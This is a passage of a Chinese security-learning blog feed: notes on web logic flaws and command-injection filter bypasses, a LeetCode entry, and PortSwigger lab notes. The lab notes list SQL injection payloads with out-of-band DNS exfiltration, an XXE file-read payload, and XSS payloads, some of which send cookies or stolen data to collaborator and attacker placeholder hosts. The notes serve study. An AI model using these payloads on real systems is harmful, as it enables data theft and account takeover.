逻辑漏洞</h2><h3 id="任意用户密码重置"><a class="anchor" href="#任意用户密码重置">#</a> 任意用户密码重置</h3><p>未经用户本身授权，在未知他人的重置密码链接或手机验证码的情况下，通过构造重置密码链接或穷举验证码等方法直接重置他人密码的一种攻击方式。任意用户密码重置影响系统的稳定性，可由此作为攻击入口，进行持续攻击。</p><ol><li>验证码无时间限制</li><li>验证码在 Response 包中回显</li><li>验证码为固定值</li><li>密码重置步骤未进行校验</li><li>未验证 cookie 信息</li><li>用户名，手机 / 邮箱号，验证码三者未进行匹配性验证</li><li>在本地客户端进行验证码校验</li><li>修改密码处 id 值可替换</li><li>修改信息时替换，添加字段值</li><li>验证码与手机 / 邮箱号未进行匹配性验证</li></ol><h3 id="短信轰炸"><a class="anchor" href="#短信轰炸">#</a> 短信轰炸</h3><p>一般就是接口没有做好时间限制或者访问限制。</p><h3 id="支付漏洞"><a class="anchor" href="#支付漏洞">#</a> 支付漏洞</h3><p>过于信任线段传入的数据，导致出现支付漏洞</p><h3 id="忘记密码绕过"><a class="anchor" href="#忘记密码绕过">#</a> 忘记密码绕过</h3><h3 id="验证码复用"><a class="anchor" href="#验证码复用">#</a> 验证码复用</h3><p>后端不删验证码是吧</p><h3 id="越权"><a class="anchor" href="#越权">#</a> 越权</h3><h4 id="水平越权"><a class="anchor" href="#水平越权">#</a> 水平越权</h4><p>水平越权指的是攻击者尝试访问与他拥有相同权限的用户的资源，怎么理解呢？比如某系统中有个人资料这个功能，A 账号和 B 账号都可以访问这个功能，但是 A 账号的个人信息和 B 账号的个人信息不同，可以理解为 A 账号和 B 账号个人资料这个功能上具备水平权限的划分。此时， A 账号通过攻击手段访问了 B 账号的个人资料，这就是水平越权漏洞。<br />常见场景：1. 基于用户身份 id；2. 基于对象 id；3. 基于文件名</p><h4 id="垂直越权"><a class="anchor" href="#垂直越权">#</a> 垂直越权</h4><p>垂直越权是不同级别之间或不同角色之间的越权，垂直越权还可以分为向上越权和向下越权。向上越权指的是一个低级别用户尝试访问高级别用户的资源，比如说某个系统分为普通用户和管理员用户，管理员有系统管理功能，而普通用户没有，那我们就可以理解成管理功能具备垂直权限划分，如果普<br />通用户能利用某种攻击手段访问到管理功能，那我们就称之为向上越权。向下越权是一个高级别用户访问低级别用户信息。</p><h2 id="命令执行"><a class="anchor" href="#命令执行">#</a> 命令执行</h2><h3 id="绕过-9"><a class="anchor" href="#绕过-9">#</a> 绕过</h3><ol><li><p>空格过滤绕过<br />使用以下符号:<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;, $&#123;IFS&#125;$1, &lt;&gt;, &lt;, &gt;, &#123;cat,/etc/passwd&#125;</span><br></pre></td></tr></table></figure></p></li><li><p>关键词过滤绕过<br />以 cat 为例，使用以下办法：<br />、、、</p></li></ol><p>ca\t, cat''t, a=l;b=s;ab, /bin/ca*, /bin/ca?, /binca [tc]<br />、、、<br />或者换成其它命令：head, tail, less, tac</p><h2 id="模板注入"><a class="anchor" href="#模板注入">#</a> 模板注入</h2><p>模板引擎（这里特指用于 Web 开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的 html 代码，模板引擎会提供一套生成 html 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板 + 用户数据的前端 html 页面，然后反馈给浏览器，呈现在用户面前。<br />SSTI 就是服务器端模板注入（Server-Side Template Injection）<br />当前使用的一些框架，比如 python 的 flask，php 的 tp，java 的 spring 等一般都采用成熟的的 MVC 的模式，用户的输入先进入 Controller 控制器，然后根据请求类型和请求的指令发送给对应 Model 业务模型进行业务逻辑判断，数据库存取，最后把结果返回给 View 视图层，经过模板渲染展示给用户。<br />漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>测试方法：4 4</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;面经总结&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>leetcode</title>
    <link href="http://ericcd.com/2022/11/29/leetcode/"/>
    <id>http://ericcd.com/2022/11/29/leetcode/</id>
    <published>2022-11-29T11:26:56.000Z</published>
    <updated>2023-02-22T12:46:55.074Z</updated>
    
    <content type="html"><![CDATA[<p>LeetCode 记录。<br /><span id="more"></span></p><ol><li><p>使用单调栈求坡的最大宽度。</p></li><li><p>填充每个节点的下一个右侧节点指针 II：<br />给定一个二叉树，填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。</p></li><li><p>数字范围按位与：<br />给你两个整数 left 和 right ，表示区间 [left, right] ，返回此区间内所有数字 按位与 的结果（包含 left 、right 端点）。</p></li><li><p>清空 vector 元素并释放空间。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">vector&lt;int&gt; ().swap (Vector);</span><br></pre></td></tr></table></figure></p></li><li><p>重新排列单词间的空格。<br />使用流区分字符和空格；string 的创建方式。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">string reorderSpaces (string text) &#123;</span><br><span class="line">           vector&lt;string&gt;  str_vec;</span><br><span class="line">           int count = 0;</span><br><span class="line">           string word, ans;</span><br><span class="line">           stringstream in (text);</span><br><span class="line">           while (in &gt;&gt; word)</span><br><span class="line">           &#123;</span><br><span class="line">               str_vec.push_back (word);</span><br><span class="line">               count += word.size (); </span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           if (str_vec.size () == 1)</span><br><span class="line">              ans = str_vec [0];</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                string space ((text.size () - count)/(str_vec.size () - 1), &#x27; &#x27;);</span><br><span class="line">                for (int i =0; i&lt; str_vec.size () - 1; i++)</span><br><span class="line">                       ans += str_vec [i] + space;</span><br><span class="line">                ans += str_vec.back ();        </span><br><span class="line">            &#125;</span><br><span class="line">            return ans + string (text.size () - ans.size (), &#x27; &#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p></li><li><p>数组的相对排序。<br />unordered_map，hash 表的使用；sort 的自定义排序方法。</p></li><li><p>旋转数字<br /> 8.Lambda 表达式<br />该表达式的使用<br /> 9.c++ 二分查找函数<br /> lower_bound ()、upper_bound ()、equal_range () 以及 binary_search ()。</p></li><li><p>前缀和矩阵<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sum = A [x1..x2][y1..y2]</span><br><span class="line">    = P [x2][y2] - P [x1 - 1][y2] - P [x2][y1 - 1] + P [x1 - 1][y1 - 1]</span><br></pre></td></tr></table></figure></p></li><li><p>差分数组<br />有利于对固定数组大量做区间加减并查询</p></li><li><p>前缀和</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;LeetCode 记录。&lt;br /&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="http://ericcd.com/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ericcd.com/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>BurpLab</title>
    <link href="http://ericcd.com/2022/11/22/BurpLab/"/>
    <id>http://ericcd.com/2022/11/22/BurpLab/</id>
    <published>2022-11-22T12:13:02.000Z</published>
    <updated>2023-04-19T13:03:10.362Z</updated>
    
    <content type="html"><![CDATA[<p>记录在做 burp lab 时学会的知识点。<br /><span id="more"></span></p><h3 id="sql-注入"><a class="anchor" href="#sql-注入">#</a> SQL 注入</h3><ol><li><p>使用 select 判断列数和获取返回值时，有时 SELECT 1,2,3 不行而 SELECT NULL,NULL,NULL 可以，可能是因为 sql 的返回值类型需要与后端接收的类型相匹配，SELECT 1,2,3 返回的都是数字，而使用 NULL 会返回不确定类型 NULL。</p></li><li><p>只能返回一条字符串语句，但是需要读取多个字符串的值时，可以使用字符串拼接。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Oracle:  &#x27;foo&#x27;||&#x27;bar&#x27;</span><br><span class="line">Microsoft:  &#x27;foo&#x27;+&#x27;bar&#x27;</span><br><span class="line">PostgreSQL:  foo&#x27;||&#x27;bar&#x27;</span><br><span class="line">MySQL:  &#x27;foo&#x27; &#x27;bar&#x27; [Note the space between the two strings],  CONCAT (&#x27;foo&#x27;,&#x27;bar&#x27;)</span><br></pre></td></tr></table></figure></p></li><li><p>在 Oracle 中，每一条 SELECT 语句后续都要跟一个 FROM，如果不确定要搜索哪个表，可以使用虚表 dual 来进行测试，例如 SELECT NULL FROM dual。</p></li><li><p>获取数据库版本信息。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Oracle:  SELECT banner FROM v$version,  SELECT version FROM v$instance</span><br><span class="line">Microsoft:  SELECT @@version</span><br><span class="line">PostgreSQL:  SELECT version ()</span><br><span class="line">MySQL:  SELECT @@version</span><br></pre></td></tr></table></figure></p></li><li><p>获取数据库中存储的表名以及其中的列名。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Oracle:  SELECT * FROM all_tables,  SELECT * FROM all_tab_columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br><span class="line">Microsoft:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br><span class="line">PostgreSQL:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br><span class="line">MySQL:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br></pre></td></tr></table></figure></p></li></ol><p>6.Oracle 中没有 LIMIT 命令，可以试着用 ROWNUM 取代下。<br />7. 可以用以下命令测试网页是否会根据返回值的 Ture or False 变换。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR (1/0) ELSE NULL END FROM dual</span><br><span class="line">MicrosoftSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</span><br><span class="line">PostgreSQL1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST (1/0 AS INTEGER) ELSE NULL END)</span><br><span class="line">MySQLSELECT IF (YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#x27;a&#x27;)</span><br></pre></td></tr></table></figure></p><ol start="8"><li><p>后端可能接受一个 int 值，也可能接收 string，也可能接收一行，这需要自己测试判断。</p></li><li><p>获取截断的字符串。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">OracleSUBSTR (&#x27;foobar&#x27;, 4, 2)</span><br><span class="line">MicrosoftSUBSTRING (&#x27;foobar&#x27;, 4, 2)</span><br><span class="line">PostgreSQLSUBSTRING (&#x27;foobar&#x27;, 4, 2)</span><br><span class="line">MySQLSUBSTRING (&#x27;foobar&#x27;, 4, 2)</span><br></pre></td></tr></table></figure></p></li><li><p>延时注入，但是后端如果异步执行 SQL，可能造成该方法失效。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Oracledbms_pipe.receive_message ((&#x27;a&#x27;),10)</span><br><span class="line">MicrosoftWAITFOR DELAY &#x27;0:0:10&#x27;</span><br><span class="line">PostgreSQLSELECT pg_sleep (10)</span><br><span class="line">MySQLSELECT SLEEP (10)</span><br></pre></td></tr></table></figure><br />11.DNS 查询<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Oracle：SELECT EXTRACTVALUE (xmltype (&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">              &lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; % remote;]&gt;&#x27;),&#x27;/l&#x27;)</span><br><span class="line">              FROM dual（有的版本能用，有的版本已经修复了）</span><br><span class="line">              SELECT UTL_INADDR.get_host_address (&#x27;BURP-COLLABORATOR-SUBDOMAIN&#x27;)（所有版本都能用，但需要权限）</span><br><span class="line">Microsoft：  exec master..xp_dirtree &#x27;//BURP-COLLABORATOR-SUBDOMAIN/a&#x27;</span><br><span class="line">PostgreSQL： copy (SELECT &#x27;&#x27;) to program &#x27;nslookup BURP-COLLABORATOR-SUBDOMAIN&#x27;</span><br><span class="line">MySQL： LOAD_FILE (&#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#x27;)</span><br><span class="line">                SELECT ... INTO OUTFILE &#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#x27;（只适用于 windows 后端）</span><br></pre></td></tr></table></figure></p></li><li><p>使用 DNS 查询带数据：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Oracle:  SELECT EXTRACTVALUE (xmltype (&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">            &lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#x27;||(SELECT YOUR-QUERY-HERE)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; % remote;]&gt;&#x27;),&#x27;/l&#x27;) </span><br><span class="line">            FROM dual</span><br><span class="line">Microsoft: declare @p varchar (1024);set @p=(SELECT YOUR-QUERY-HERE);exec (&#x27;master..xp_dirtree &quot;//&#x27;+@p+&#x27;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#x27;)</span><br><span class="line">PostgreSQL: create OR replace function f () returns void as $$</span><br><span class="line">                   declare c text;</span><br><span class="line">                   declare p text;</span><br><span class="line">                   begin</span><br><span class="line">                   SELECT into p (SELECT YOUR-QUERY-HERE);</span><br><span class="line">                   c := &#x27;copy (SELECT &#x27;&#x27;&#x27;&#x27;) to program &#x27;&#x27;nslookup &#x27;||p||&#x27;.BURP-COLLABORATOR-SUBDOMAIN&#x27;&#x27;&#x27;;</span><br><span class="line">                   execute c;</span><br><span class="line">                   END;</span><br><span class="line">                   $$ language plpgsql security definer;</span><br><span class="line">                   SELECT f ();</span><br><span class="line">MySQL: SELECT YOUR-QUERY-HERE INTO OUTFILE &#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#x27;（仅在 windows 有用）</span><br></pre></td></tr></table></figure></p></li><li><p>可以用简单的 +,- 来判断某些数字参数是否会被后台执行。</p></li><li><p>当返回只能有一列而结果有多列时，可以考虑以下方法将多列拼成一列。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT username || &#x27;~&#x27; || password FROM users</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="xxe"><a class="anchor" href="#xxe">#</a> XXE</h3><ol><li>一段简单的 XML payload，用来展示 xml 格式。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [ </span><br><span class="line">&lt;!ELEMENT name ANY &gt; </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:/etc/passwd&quot; &gt;]&gt; </span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt; </span><br></pre></td></tr></table></figure></li></ol><h3 id="xss"><a class="anchor" href="#xss">#</a> XSS</h3><p>0.payload 汇总。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=alert (1)&gt;</span><br><span class="line">&lt;svg onload=alert (1)&gt;</span><br><span class="line">javascript:alert (document.cookie)</span><br><span class="line">&quot;onmouseover=&quot;alert (1)</span><br><span class="line">&#x27;-alert (1)-&#x27;</span><br><span class="line">$on.constructor (&#x27;alert (1)&#x27;)()</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">fetch (&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;, &#123;</span><br><span class="line">method: &#x27;POST&#x27;,</span><br><span class="line">mode: &#x27;no-cors&#x27;,</span><br><span class="line">body:document.cookie</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var req = new XMLHttpRequest ();</span><br><span class="line">req.onload = handleResponse;</span><br><span class="line">req.open (&#x27;get&#x27;,&#x27;/my-account&#x27;,true);</span><br><span class="line">req.send ();</span><br><span class="line">function handleResponse () &#123;</span><br><span class="line">    var token = this.responseText.match (/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/)[1];</span><br><span class="line">    var changeReq = new XMLHttpRequest ();</span><br><span class="line">    changeReq.open (&#x27;post&#x27;, &#x27;/my-account/change-email&#x27;, true);</span><br><span class="line">    changeReq.send (&#x27;csrf=&#x27;+token+&#x27;&amp;email=test@test.com&#x27;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;xss id=x onfocus=alert (document.cookie) tabindex=1&gt;</span><br><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert (1)&gt;</span><br><span class="line">accesskey=&#x27;x&#x27;onclick=&#x27;alert (1)</span><br><span class="line"></span><br><span class="line"> 以下带绕过功能 </span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert (1)&lt;/script&gt;</span><br><span class="line">\&#x27;-alert (1)//</span><br><span class="line">http://foo?&amp;apos;-alert (1)-&amp;apos;</span><br><span class="line">$&#123;alert (1)&#125;</span><br><span class="line"></span><br><span class="line">&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert (1)/&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</span><br><span class="line">x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;</span><br><span class="line"></span><br><span class="line">（AngularJS）：</span><br><span class="line">toString ().constructor.prototype.charAt=[].join;[1]|orderBy:toString ().constructor.fromCharCode (120,61,97,108,101,114,116,40,49,41)=1 </span><br><span class="line">&lt;input autofocus ng-focus=&quot;$event.path|orderBy:&#x27;[].constructor.from ([1],alert)&#x27;&quot;&gt; </span><br><span class="line">[1].map (alert)</span><br><span class="line">&lt;input id=x ng-focus=$event.path|orderBy:&#x27;(z=alert)(document.cookie)&#x27;&gt;#x</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;img src=&#x27;//attacker-website.com?</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if (window.name) &#123;</span><br><span class="line">new Image ().src=&#x27;subdomain//?&#x27;+encodeURIComponent (window.name);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">location = &#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert (1)&lt;/script&gt;&amp;token=;script-src-elem &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure></p><ol><li><p>使用以下代码，对使用了 innerHTML 的网页实现 DOM XSS 攻击，innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=alert (1)&gt;</span><br></pre></td></tr></table></figure></p></li><li><p>一段 payload。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;svg onload=alert (1)&gt;</span><br></pre></td></tr></table></figure></p></li><li><p>网页的代码可能会从 url 中获取参数，url 中的参数不一定都是传给后端的，通过修改这些参数可能触发 XSS。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">javascript:alert (document.cookie)</span><br></pre></td></tr></table></figure></p></li></ol><p>4.DOM 型的 XSS，目前来看是通过在 html 中添加 img 或者 svg 等元素，然后通过触发其中的 onerror 等属性来运行自己的 payload。<br />5. 为什么使用 HTML 编码能预防 XSS 攻击。<br />HTML 在解析时存在多种状态，在这个问题中需要了解 &quot;Tag open state&quot;, &quot;Tag name state&quot; 和 &quot;Data state&quot;,HTML 初始为 &quot;Data state&quot;, 在遇到第一个 &lt; 后进入 &quot;Tag open state&quot;, 之后在遇到第一个字符时<br />进入 &quot;Tag name state&quot;，直到遇到 &gt; 结束。当我们的 XSS 代码（比如 &lt;script&gt;alert ()&lt;/script&gt;）被 HTML 编码后，HTML 遇到被编码后的 &lt;，不会进入 &quot;Tag open state&quot;，而是会保持 &quot;Data state&quot; 并对其解码，因此 &lt; script &gt; 标签不会发挥作用。<br />6. 使用以下代码绕过 html 编码保护， 仅在 DOM 中有用：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&quot;onmouseover=&quot;alert (1)</span><br></pre></td></tr></table></figure><br />7. 一种新的 payload, 用于封闭 script 中变量的 ''。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x27;-alert (1)-&#x27;</span><br></pre></td></tr></table></figure><br />8. 有的变量里面也可以变成 payload，比如 a=b，但是如果只是修改 b 不能造成 xss，因为编译器只会将 payload 赋给 a，需要用一些符号让 payload 执行才行。之前的 sql 注入也有这种问题。<br />9.window.location 对象所包含的属性。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hash: 从井号开始的 URL</span><br><span class="line">host: 主机名和当前 URL 的端口号 </span><br><span class="line">hostname: 当前 URL 的主机名 </span><br><span class="line">href: 完整的 URL</span><br><span class="line">pathname: 当前 URL 的路径部分 </span><br><span class="line">port: 当前 URL 的端口号 </span><br><span class="line">protocol: 当前 URL 的协议 </span><br><span class="line">search: 从问号开始的 URL</span><br></pre></td></tr></table></figure><br />10. 一种新的 payload。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$on.constructor (&#x27;alert (1)&#x27;)()</span><br></pre></td></tr></table></figure></p><p>11.AngularJS 是一个 js 框架，当有 ng-app 属性的 html 元素的内容被更改是，会执行 {分隔符 {分隔符} 分隔符} 的内容（分隔符当不存在，不加这个 hexo 报错）。<br />12.js 文件中存在变量赋值的地方需要注意，可以通过修改变量赋值，让其变成包含指令的运算，从而达到执行指令的目的。</p><ol start="13"><li><p>用于获取 cookie 的 payload<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">fetch (&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;, &#123;</span><br><span class="line">method: &#x27;POST&#x27;,</span><br><span class="line">mode: &#x27;no-cors&#x27;,</span><br><span class="line">body:document.cookie</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p></li><li><p>使用在 CSRF 中学到的基础绕过，依旧没有绕过 token，使用以下 XSS 的 payload 可以获取用户的 token。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var req = new XMLHttpRequest ();</span><br><span class="line">req.onload = handleResponse;</span><br><span class="line">req.open (&#x27;get&#x27;,&#x27;/my-account&#x27;,true);</span><br><span class="line">req.send ();</span><br><span class="line">function handleResponse () &#123;</span><br><span class="line">    var token = this.responseText.match (/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/)[1];</span><br><span class="line">    var changeReq = new XMLHttpRequest ();</span><br><span class="line">    changeReq.open (&#x27;post&#x27;, &#x27;/my-account/change-email&#x27;, true);</span><br><span class="line">    changeReq.send (&#x27;csrf=&#x27;+token+&#x27;&amp;email=test@test.com&#x27;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p></li><li><p>通过 burp intruder 配合 XSS cheat sheet 绕过 WAF，主要是通过字典找到 WAF 遗漏的标签和指令，从而根据这些漏洞实现攻击。</p></li><li><p>一种新的触发方法：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;xss id=x onfocus=alert (document.cookie) tabindex=1&gt;</span><br></pre></td></tr></table></figure><br />tabindex 将该标签设置为可以聚焦，之后可以在 